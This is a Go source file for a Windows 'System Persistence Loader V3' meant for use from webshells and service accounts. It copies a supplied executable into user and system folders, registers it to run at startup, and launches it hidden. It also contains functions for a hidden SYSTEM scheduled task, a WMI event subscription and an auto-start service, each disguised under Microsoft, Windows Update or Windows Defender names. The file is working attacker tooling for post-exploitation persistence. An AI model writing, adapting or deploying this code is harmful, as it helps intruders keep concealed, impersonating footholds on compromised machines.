package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const (
	windowsTempDir = `C:\Windows\Temp`
	dirPerm        = 0755
	filePerm       = 0644

	noWindowFlag       = uint32(0x08000000) // CREATE_NO_WINDOW
	newProcessGroupFlag = uint32(0x00000200)
)

func hiddenProcAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{HideWindow: true}
}

func hiddenProcAttrWithFlags() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: noWindowFlag | newProcessGroupFlag,
	}
}

func runHidden(name string, args ...string) ([]byte, error) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = hiddenProcAttr()
	return cmd.CombinedOutput()
}

func writeFile(path string, data []byte) error {
	if err := os.MkdirAll(filepath.Dir(path), dirPerm); err != nil {
		return err
	}
	return os.WriteFile(path, data, filePerm)
}

func workingDir() string {
	pwd, err := os.Getwd()
	if err != nil {
		return ""
	}
	return pwd
}

// Copy file to destination
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	os.MkdirAll(filepath.Dir(dst), dirPerm)

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// Simple user-writable placement paths (visible, no hidden attrs)
func getPlacementLocations() []string {
	var locations []string

	if home, err := os.UserHomeDir(); err == nil && home != "" {
		locations = append(locations,
			filepath.Join(home, "AppData", "Local"),
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Downloads"),
			home,
		)
	}
	if localAppData := os.Getenv("LOCALAPPDATA"); localAppData != "" {
		locations = append(locations, localAppData)
	}
	if appData := os.Getenv("APPDATA"); appData != "" {
		locations = append(locations, appData)
	}

	locations = append(locations,
		`C:\Temp`,
		`C:\Users\Public`,
	)

	// Fallbacks when running as a service / webshell with limited profile access
	locations = append(locations,
		`C:\Windows\Temp`,
		`C:\ProgramData`,
	)

	return locations
}

func getSystemLocations() []string {
	return getPlacementLocations()
}

// Create scheduled task for persistence (works with system accounts)
func createScheduledTask(executablePath string) error {
	taskName := "MicrosoftWindowsUpdate" + fmt.Sprintf("%d", time.Now().Unix()%10000)
	now := time.Now().Format("2006-01-02T15:04:05")

	xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>%s</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Task</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <StartBoundary>%s</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT30M</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%s</Command>
    </Exec>
  </Actions>
</Task>`, now, now, executablePath)

	xmlFile := filepath.Join(windowsTempDir, taskName+".xml")
	if err := writeFile(xmlFile, []byte(xmlContent)); err != nil {
		return fmt.Errorf("failed to write XML file: %v", err)
	}
	defer os.Remove(xmlFile)

	output, err := runHidden("schtasks", "/create", "/tn", taskName, "/xml", xmlFile, "/f")
	if err != nil {
		return fmt.Errorf("schtasks failed: %v - %s", err, string(output))
	}

	fmt.Printf("✓ Scheduled task created: %s\n", taskName)
	return nil
}

// Create WMI-based persistence
func createWMIPersistence(executablePath string) error {
	eventName := "WindowsDefenderUpdate" + fmt.Sprintf("%d", time.Now().Unix()%1000)

	wmiScript := fmt.Sprintf(`
		$consumer = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
			Name='%s'
			EventNamespace='root\cimv2'
			QueryLanguage='WQL'
			Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
		}
		
		$action = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
			Name='%s'
			CommandLineTemplate='%s'
		}
		
		Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
			Filter=$consumer
			Consumer=$action
		}
	`, eventName, eventName, executablePath)

	scriptFile := filepath.Join(windowsTempDir, "wmi_setup.ps1")
	if err := writeFile(scriptFile, []byte(wmiScript)); err != nil {
		return fmt.Errorf("failed to write WMI script: %v", err)
	}
	defer os.Remove(scriptFile)

	output, err := runHidden("powershell", "-ExecutionPolicy", "Bypass", "-File", scriptFile)
	if err != nil {
		return fmt.Errorf("WMI setup failed: %v - %s", err, string(output))
	}

	fmt.Printf("✓ WMI persistence created: %s\n", eventName)
	return nil
}

// Create service-based persistence
func createServicePersistence(executablePath string) error {
	serviceName := "WindowsUpdateSvc" + fmt.Sprintf("%d", time.Now().Unix()%1000)
	displayName := "Windows Update Service Helper"

	output, err := runHidden("sc", "create", serviceName,
		"binpath=", executablePath,
		"type=", "own",
		"start=", "auto",
		"DisplayName=", displayName)
	if err != nil {
		return fmt.Errorf("service creation failed: %v - %s", err, string(output))
	}

	// Don't fail if service doesn't start immediately
	runHidden("sc", "start", serviceName)

	fmt.Printf("✓ Service created: %s\n", serviceName)
	return nil
}

// User-level Startup folder for the current account
func getUserStartupDir() (string, error) {
	if appData := os.Getenv("APPDATA"); appData != "" {
		dir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(dir); err == nil {
			return dir, nil
		}
	}

	if home, err := os.UserHomeDir(); err == nil && home != "" {
		dir := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(dir); err == nil {
			return dir, nil
		}
	}

	return "", fmt.Errorf("user startup folder not found")
}

// Register the copied file in the current user's Startup folder
func createUserStartupPersistence(executablePath string) error {
	startupDir, err := getUserStartupDir()
	if err != nil {
		return err
	}

	launcherName := strings.TrimSuffix(filepath.Base(executablePath), filepath.Ext(executablePath)) + ".bat"
	launcherPath := filepath.Join(startupDir, launcherName)
	launcherContent := fmt.Sprintf(`@echo off
start "" "%s"`, executablePath)

	if err := os.WriteFile(launcherPath, []byte(launcherContent), filePerm); err != nil {
		return fmt.Errorf("failed to write startup launcher: %v", err)
	}

	fmt.Printf("✓ User startup: %s -> %s\n", launcherPath, executablePath)
	return nil
}

// Copy target to the first writable location, then add user-level startup
func createSystemPersistence(targetPath string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	absTargetPath, err := filepath.Abs(targetPath)
	if err != nil {
		return err
	}

	// Keep the original filename so the dropped file is easy to find
	dropName := filepath.Base(absTargetPath)
	if !strings.EqualFold(filepath.Ext(dropName), ".exe") {
		hash := sha256.Sum256([]byte(absTargetPath))
		dropName = "winupdate" + hex.EncodeToString(hash[:3]) + ".exe"
	}

	locations := getPlacementLocations()
	var persistentPath string

	fmt.Printf("Trying %d placement locations...\n", len(locations))

	for i, location := range locations {
		if _, err := os.Stat(location); err != nil {
			fmt.Printf("[%d/%d] Skip (missing): %s\n", i+1, len(locations), location)
			continue
		}

		testPath := filepath.Join(location, dropName)
		fmt.Printf("[%d/%d] Trying: %s\n", i+1, len(locations), testPath)

		if copyErr := copyFile(absTargetPath, testPath); copyErr != nil {
			fmt.Printf("✗ Failed: %v\n", copyErr)
			continue
		}

		persistentPath = testPath
		fmt.Printf("✓ SUCCESS: Copied to %s\n", testPath)
		break
	}

	if persistentPath == "" {
		return fmt.Errorf("failed to copy to any placement location")
	}

	fmt.Println("\nRegistering user-level startup...")
	if err := createUserStartupPersistence(persistentPath); err != nil {
		return fmt.Errorf("startup registration failed: %v", err)
	}

	fmt.Printf("✓ Persistent file: %s\n", persistentPath)
	return nil
}

// Check if running as system service account
func isSystemAccount() bool {
	username := os.Getenv("USERNAME")
	return strings.HasSuffix(username, "$") ||
		username == "SYSTEM" ||
		username == "LOCAL SERVICE" ||
		username == "NETWORK SERVICE"
}

// Execute target
func executeTarget(targetPath string) error {
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		return fmt.Errorf("target not found: %s", targetPath)
	}

	absPath, err := filepath.Abs(targetPath)
	if err != nil {
		return err
	}

	fmt.Printf("Launching: %s\n", absPath)

	cmd := exec.Command(absPath)
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = hiddenProcAttrWithFlags()
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start: %v", err)
	}

	fmt.Printf("✓ Process started (PID: %d)\n", cmd.Process.Pid)
	return nil
}

func main() {
	helpFlag := flag.Bool("h", false, "Show help")
	execFlag := flag.String("u", "", "Execute target")
	persistFlag := flag.Bool("persist", false, "Create system persistence")
	infoFlag := flag.Bool("info", false, "Show system info")
	flag.Parse()

	if *helpFlag {
		fmt.Printf("%s - System Persistence Loader V3\n", filepath.Base(os.Args[0]))
		fmt.Printf("Usage:\n")
		fmt.Printf("  %s -u <executable> -persist   - Execute with system persistence\n", os.Args[0])
		fmt.Printf("  %s -u <executable>            - Just execute\n", os.Args[0])
		fmt.Printf("  %s -info                      - Show system info\n", os.Args[0])
		fmt.Printf("  %s -h                         - Show help\n", os.Args[0])
		fmt.Printf("\nDesigned for system/service accounts and webshells\n")
		return
	}

	if *infoFlag {
		fmt.Printf("=== System Information V3 ===\n")
		fmt.Printf("Current directory: %s\n", workingDir())
		fmt.Printf("USERPROFILE: %s\n", os.Getenv("USERPROFILE"))
		fmt.Printf("USERNAME: %s\n", os.Getenv("USERNAME"))
		fmt.Printf("COMPUTERNAME: %s\n", os.Getenv("COMPUTERNAME"))
		fmt.Printf("System account: %t\n", isSystemAccount())

		if startupDir, err := getUserStartupDir(); err == nil {
			fmt.Printf("User startup folder: %s\n", startupDir)
		}

		fmt.Println("\nAccessible placement locations:")
		for i, loc := range getPlacementLocations() {
			if _, err := os.Stat(loc); err == nil {
				fmt.Printf("  [%d] ✓ %s\n", i+1, loc)
			} else {
				fmt.Printf("  [%d] ✗ %s\n", i+1, loc)
			}
		}
		return
	}

	if *execFlag == "" {
		fmt.Printf("Error: No target specified. Use -h for help.\n")
		return
	}

	fmt.Printf("=== System Persistence Loader V3 ===\n")
	fmt.Printf("Running from: %s\n", workingDir())
	fmt.Printf("User context: %s\n", os.Getenv("USERNAME"))

	if isSystemAccount() {
		fmt.Printf("✓ System service account detected - using system persistence methods\n")
	}

	if *persistFlag {
		fmt.Printf("Creating system persistence for: %s\n", *execFlag)

		if err := createSystemPersistence(*execFlag); err != nil {
			fmt.Printf("✗ System persistence failed: %v\n", err)
			fmt.Println("Trying to execute anyway...")
		} else {
			fmt.Printf("✓ System persistence created successfully\n")
		}
	}

	fmt.Printf("Executing target...\n")
	if err := executeTarget(*execFlag); err != nil {
		fmt.Printf("✗ Execution failed: %v\n", err)
		return
	}

	time.Sleep(1 * time.Second)
	fmt.Printf("✓ Complete\n")
}
